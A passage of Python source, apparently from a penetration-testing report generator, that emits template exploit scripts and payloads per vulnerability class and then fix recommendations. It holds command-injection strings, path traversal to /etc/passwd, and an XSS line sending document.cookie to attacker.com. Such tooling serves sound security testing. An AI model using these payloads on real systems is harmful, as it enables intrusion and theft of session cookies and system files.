        print(f"    Response: {r.status_code} - {r.text[:100]}")
    return

if __name__ == "__main__":
    exploit_ssrf()
```
''')
        
        if "rce" in vuln_classes:
            code_sections.append('''
### RCE Exploit (Python)
```python
import requests

TARGET = "http://target/exec"

def exploit_rce():
    payloads = [
        "; id",
        "| whoami",
        "$(id)",
        "`id`",
    ]
    
    for payload in payloads:
        r = requests.get(TARGET, params={"cmd": payload})
        if "uid=" in r.text or "root" in r.text:
            print(f"[+] RCE confirmed with: {payload}")
            print(f"    Output: {r.text}")
    return

if __name__ == "__main__":
    exploit_rce()
```
''')
        
        if "xss" in vuln_classes:
            code_sections.append('''
### XSS Payload Examples
```html
<!-- Reflected XSS -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- DOM XSS -->
javascript:alert(document.cookie)

<!-- Stored XSS -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
```
''')
        
        if "lfi" in vuln_classes:
            code_sections.append('''
### LFI Exploit (Python)
```python
import requests

TARGET = "http://target/file"

def exploit_lfi():
    payloads = [
        "../../etc/passwd",
        "....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
    ]
    
    for payload in payloads:
        r = requests.get(TARGET, params={"path": payload})
        if "root:" in r.text:
            print(f"[+] LFI confirmed with: {payload}")
            print(r.text)
    return

if __name__ == "__main__":
    exploit_lfi()
```
''')
        
        # If we have findings but no specific exploit code, show generic message
        if len(code_sections) == 1:  # Only header
            code_sections.append("""
See findings above for vulnerability details and payloads.
Exploit code generation not available for this vulnerability type.
""")
        
        return "\n".join(code_sections)
    
    def _generate_recommendations(self, findings: list[ZeroDayFinding]) -> str:
        """Generate recommendations based on actual findings."""
        if not findings:
            return "No vulnerabilities found. Continue with security best practices."
        
        recommendations = []
        vuln_classes = {f.vulnerability_class for f in findings}
        
        if "nosql_injection" in vuln_classes:
            recommendations.append("- Implement parameterized queries for MongoDB/NoSQL operations")
            recommendations.append("- Validate and sanitize all user input before database queries")
        
        if "sql_injection" in vuln_classes:
            recommendations.append("- Use parameterized queries or prepared statements")
            recommendations.append("- Implement input validation and escaping")
        
        if "jwt_bypass" in vuln_classes or "authentication_bypass" in vuln_classes:
            recommendations.append("- Enforce JWT algorithm whitelist (e.g., RS256 only)")
            recommendations.append("- Validate JWT signature and claims server-side")
        
        if "xss" in vuln_classes:
            recommendations.append("- Implement Content Security Policy (CSP)")
            recommendations.append("- Encode output and validate input")
        
        if "ssti" in vuln_classes:
            recommendations.append("- Use sandboxed template engines")
            recommendations.append("- Never pass user input directly to template rendering")
        
        if "ssrf" in vuln_classes:
            recommendations.append("- Implement URL allowlisting")
            recommendations.append("- Block requests to internal networks and metadata endpoints")
        
        if "rce" in vuln_classes:
            recommendations.append("- Never pass user input to shell commands")
            recommendations.append("- Use safe APIs instead of system calls")
        
        if "lfi" in vuln_classes:
            recommendations.append("- Validate file paths against allowlist")
            recommendations.append("- Use basename() and realpath() to prevent traversal")
        
        # Generic recommendations
        recommendations.append("- Implement rate limiting on all endpoints")
        recommendations.append("- Enable security headers (X-Frame-Options, X-Content-Type-Options)")
        recommendations.append("- Regular security audits and penetration testing")
        
        return "\n".join(recommendations)
    
    def _generate_evidence_summary(self, findings: list[ZeroDayFinding]) -> str:
        """Generate evidence summary based on actual findings."""
        if not findings:
            return """- No vulnerabilities confirmed during this scan
- All tests completed without finding exploitable issues
- Continue monitoring for potential security issues"""
        
        validated_count = sum(1 for f in findings if f.validation_status == "validated")
        potential_count = sum(1 for f in findings if f.validation_status == "potential")
        
        summary_lines = [
            f"- Total findings: {len(findings)}",
            f"- Validated (confirmed): {validated_count}",
            f"- Potential (needs verification): {potential_count}",
        ]
        
        if validated_count > 0:
            summary_lines.append("- Evidence collected with hashes for verification")
            summary_lines.append("- False positive checks performed on validated findings")
        
        severity_counts = {}
        for f in findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        
        for sev, count in sorted(severity_counts.items(), key=lambda x: ["critical", "high", "medium", "low"].index(x[0]) if x[0] in ["critical", "high", "medium", "low"] else 99):
            summary_lines.append(f"- {sev.upper()}: {count}")
        
        return "\n".join(summary_lines)
